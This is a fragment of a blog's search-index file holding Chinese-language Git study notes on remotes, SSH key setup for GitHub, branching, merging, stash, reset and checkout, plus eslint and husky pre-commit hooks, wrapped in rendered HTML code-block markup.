class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">git remote -v 查看当前所有远程地址别名、</span><br><span class="line"></span><br><span class="line">git remote add [别名] [远程地址]</span><br><span class="line"></span><br><span class="line">如：git remote add bieming https:&#x2F;&#x2F;github.com&#x2F;xiaobai975&#x2F;JUNSHI.git</span><br><span class="line">推送，一般先拉取最新的文件在修改提交push</span><br><span class="line"></span><br><span class="line">git push [别名] [分支名]：[分支名]</span><br><span class="line"></span><br><span class="line">如：git push junshi_ssh master:master</span><br><span class="line">克隆</span><br><span class="line">git clone [远程地址]</span><br><span class="line">stat</span><br><span class="line">拉取！</span><br><span class="line">git pull + 用户别名 +分支名</span><br><span class="line"></span><br><span class="line">若仓库有东西先</span><br><span class="line">git pull --rebase junshi_ssh mastergit </span><br></pre></td></tr></table></figure><h2 id="重点⑥SSH登陆"><a href="#重点⑥SSH登陆" class="headerlink" title="重点⑥SSH登陆"></a>重点⑥SSH登陆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">进入当前用户的家目录</span><br><span class="line">$ cd ~</span><br><span class="line">删除.ssh 目录</span><br><span class="line">$ rm -rvf .ssh</span><br><span class="line">运行命令生成.ssh 密钥目录</span><br><span class="line">$ ssh-keygen -t rsa -C junshi975@aliyun.com</span><br><span class="line">[注意：这里-C 这个参数是大写的 C]</span><br><span class="line">进入.ssh 目录查看文件列表</span><br><span class="line">$ cd .ssh</span><br><span class="line">$ ls -lF</span><br><span class="line">查看 id_rsa.pub 文件内容</span><br><span class="line">$ cat id_rsa.pub</span><br><span class="line">复制 id_rsa.pub 文件内容，登录 GitHub，点击用户头像→Settings→SSH and GPG keys</span><br><span class="line">New SSH Key</span><br><span class="line">输入复制的密钥信息</span><br><span class="line">回到 Git bash 创建远程地址别名</span><br><span class="line">git remote add origin_ssh git@github.com:atguigu2018ybuq&#x2F;huashan.git</span><br><span class="line">推送文件进行测试</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">拉取！ git pull + 用户别名 +分支名</span><br><span class="line">推送，一般先拉取最新的文件在修改提交push</span><br><span class="line"></span><br><span class="line">git push [别名] [分支名]：[分支名]</span><br><span class="line">合并分支：先切换到需要合并的分支里，git merge + 在修改过东西的分支名</span><br><span class="line">合并分支         : git merge branchname</span><br><span class="line">    快进合并 --&gt; 不会产生冲突</span><br><span class="line">    典型合并 --&gt; 有机会产生冲突</span><br><span class="line">    解决冲突 --&gt; 打开冲突的文件 进行修改 add commit </span><br><span class="line"></span><br><span class="line">查看分支列表 : git branch</span><br><span class="line">查看合并到当前分支的分支列表: git branch --merged</span><br><span class="line">    一旦出现在这个列表中 就应该删除</span><br><span class="line">查看没有合并到当前分支的分支列表: git branch --no-merged</span><br><span class="line">    一旦出现在这个列表中 就应该观察一下是否需要合并</span><br><span class="line">创建分支            : git branch branchname</span><br><span class="line">切换分支           : git checkout  branchname</span><br><span class="line">创建&amp;切换分支     : git checkout -b branchname</span><br><span class="line">版本穿梭(时光机) :  git branch branchname commitHash  </span><br><span class="line">普通删除分支      : git  branch -d branchname</span><br><span class="line">强制删除分支      : git  branch -D branchname</span><br></pre></td></tr></table></figure><h2 id="做跟踪"><a href="#做跟踪" class="headerlink" title="做跟踪"></a>做跟踪</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">克隆才仓库时 会自动为master做跟踪</span><br><span class="line">本地没有分支</span><br><span class="line">    git checkout --track 远程跟踪分支(remote&#x2F;分支名)</span><br><span class="line">本地已经创建了分支</span><br><span class="line">    git branch -u 远程跟踪分支(remote&#x2F;分支名)</span><br></pre></td></tr></table></figure><h2 id="C-新增"><a href="#C-新增" class="headerlink" title="C(新增)"></a>C(新增)</h2><pre><code>在工作目录中新增文件git statusgit add ./git commit -m &quot;msg&quot;    </code></pre><h2 id="U-修改"><a href="#U-修改" class="headerlink" title="U(修改)"></a>U(修改)</h2><pre><code>在工作目录中修改文件git statusgit add ./git commit -m &quot;msg&quot;     </code></pre><h2 id="D-删除-amp-重命名"><a href="#D-删除-amp-重命名" class="headerlink" title="D(删除 &amp; 重命名)"></a>D(删除 &amp; 重命名)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git rm 要删除的文件     git mv 老文件 新文件</span><br><span class="line">git  status             git  status</span><br><span class="line">git commit -m &quot;msg&quot;     git commit -m &quot;msg&quot;</span><br></pre></td></tr></table></figure><h2 id="R-查询"><a href="#R-查询" class="headerlink" title="R(查询)"></a>R(查询)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git  status   :  查看工作目录中文件的状态(已跟踪(已提交 已暂存 已修改) 未跟踪)</span><br><span class="line">git  diff     :  查看未暂存的修改</span><br><span class="line">git  diff --cache : 查看未提交的暂存</span><br><span class="line">git  log --oneline : 查看提交记录</span><br></pre></td></tr></table></figure><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><pre><code>分支的本质其实就是一个提交对象!!!HEAD:     是一个指针 它默认指向master分支 切换分支时其实就是让HEAD指向不同的分支    每次有新的提交时 HEAD都会带着当前指向的分支 一起往前移动git  log --oneline --decorate --graph --all : 查看整个项目的分支图  git branch : 查看分支列表git branch -v: 查看分支指向的最新的提交git branch name : 在当前提交对象上创建新的分支git branch name commithash: 在指定的提交对象上创建新的分支git checkout name :     切换分支git branch -d name : 删除空的分支 删除已经被合并的分支git branch -D name : 强制删除分支 </code></pre><h2 id="git分支本质"><a href="#git分支本质" class="headerlink" title="git分支本质"></a>git分支本质</h2><pre><code>分支本质是一个提交对象,所有的分支都会有机会被HEAD所引用(HEAD一个时刻只会指向一个分支)当我们有新的提交的时候 HEAD会携带当前持有的分支往前移动</code></pre><h2 id="重点④git分支命令"><a href="#重点④git分支命令" class="headerlink" title="重点④git分支命令"></a>重点④git分支命令</h2><pre><code>创建分支            : git branch branchname切换分支           : git checkout  branchname创建&amp;切换分支     : git checkout -b branchname版本穿梭(时光机) :  git branch branchname commitHash  普通删除分支      : git  branch -d branchname强制删除分支      : git  branch -D branchname合并分支：先切换到需要合并的分支里，git merge + 在修改过东西的分支名合并分支         : git merge branchname    快进合并 --&gt; 不会产生冲突    典型合并 --&gt; 有机会产生冲突    解决冲突 --&gt; 打开冲突的文件 进行修改 add commit 查看分支列表 : git branch查看合并到当前分支的分支列表: git branch --merged    一旦出现在这个列表中 就应该删除查看没有合并到当前分支的分支列表: git branch --no-merged    一旦出现在这个列表中 就应该观察一下是否需要合并</code></pre><h2 id="★git分支的注意点"><a href="#★git分支的注意点" class="headerlink" title="★git分支的注意点"></a>★git分支的注意点</h2><pre><code>在切换的时候 一定要保证当前分支是干净的!!!    允许切换分支:         分支上所有的内容处于 已提交状态            (避免)分支上的内容是初始化创建 处于未跟踪状态        (避免)分支上的内容是初始化创建 第一次处于已暂存状态    不允许切分支:         分支上所有的内容处于 已修改状态  或 第二次以后的已暂存状态  在分支上的工作做到一半时 如果有切换分支的需求, 我们应该将现有的工作存储起来    git stash : 会将当前分支上的工作推到一个栈中    分支切换  进行其他工作 完成其他工作后 切回原分支    git stash apply : 将栈顶的工作内容还原 但不让任何内容出栈     git stash drop  : 取出栈顶的工作内容后 就应该将其删除(出栈)    git stash pop   :      git stash apply +  git stash drop     git stash list : 查看存储</code></pre><h2 id="后悔药"><a href="#后悔药" class="headerlink" title="后悔药"></a>后悔药</h2><pre><code>撤销工作目录的修改   :  git checkout -- filename撤销暂存区的修改     :  git reset HEAD  filename撤销提交             :  git commit --amend</code></pre><h2 id="reset三部曲"><a href="#reset三部曲" class="headerlink" title="reset三部曲"></a>reset三部曲</h2><pre><code>git reset --soft commithash    ---&gt; 用commithash的内容重置HEAD内容git reset [--mixed] commithash ---&gt; 用commithash的内容重置HEAD内容 重置暂存区git reset --hard commithash    ---&gt; 用commithash的内容重置HEAD内容 重置暂存区 重置工作目录</code></pre><h2 id="路径reset"><a href="#路径reset" class="headerlink" title="路径reset"></a>路径reset</h2><pre><code>所有的路径reset都要省略第一步!!!    第一步是重置HEAD内容  我们知道HEAD本质指向一个分支 分支的本质是一个提交对象     提交对象 指向一个树对象 树对象又很有可能指向多个git对象 一个git对象代表一个文件!!!    HEAD可以代表一系列文件的状态!!!!git reset [--mixed] commithash filename       用commithash中filename的内容重置暂存区</code></pre><h2 id="checkout深入理解"><a href="#checkout深入理解" class="headerlink" title="checkout深入理解"></a>checkout深入理解</h2><pre><code>git   checkout brancname  跟   git reset --hard commithash特别像    共同点        都需要重置 HEAD   暂存区   工作目录    区别         checkout对工作目录是安全的    reset --hard是强制覆盖         checkout动HEAD时不会带着分支走而是切换分支         reset --hard时是带着分支走checkout + 路径      git checkout commithash  filename              重置暂存区           重置工作目录      git checkout -- filename            重置工作目录  </code></pre><h2 id="eslint"><a href="#eslint" class="headerlink" title="eslint"></a>eslint</h2><pre><code>js代码的检查工具下载: npm i eslint -D使用:    生成配置文件 npx eslint --init    检查js文件   npx eslint 目录名    命中的规则:        字符串必须使用单引号        语句结尾不能有分号        文件的最后必须要有换行</code></pre><h2 id="eslint结合git"><a href="#eslint结合git" class="headerlink" title="eslint结合git"></a>eslint结合git</h2><pre><code>husky: 哈士奇, 为Git仓库设置钩子程序使用    在仓库初始化完毕之后 再去安装哈士奇    在package.json文件写配置        &quot;husky&quot;: &#123;            &quot;hooks&quot;: &#123;              &quot;pre-commit&quot;: &quot;npm run lint&quot;                 //在git commit之前一定要通过npm run lint的检查              // 只有npm run lint不报错时 commit才能真正的运行            &#125;          &#125;           </code></pre><h2 id="三个必须懂得概念"><a href="#三个必须懂得概念" class="headerlink" title="三个必须懂得概念"></a>三个必须懂得概念</h2><pre><code>本地分支远程跟踪分支(remote/分支名)远程分支</code></pre><h2 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h2><pre><code>git push + 用户别名 +分支名</code></pre><h2 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h2><pre><code>git pull + 用户别名 +分支名</code></pre><h2 id="pull-request"><a href="#pull-request" class="headerlink" title="pull request"></a>pull request</h2><pre><code>让第三方人员参与到项目中 fork</code></pre><h2 id="使用频率最高的五个命令"><a href="#使用频率最高的五个命令" class="headerlink" title="使用频率最高的五个命令"></a>使用频率最高的五个命令</h2><pre><code>git statusgit addgit commitgit pushgit pull</code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
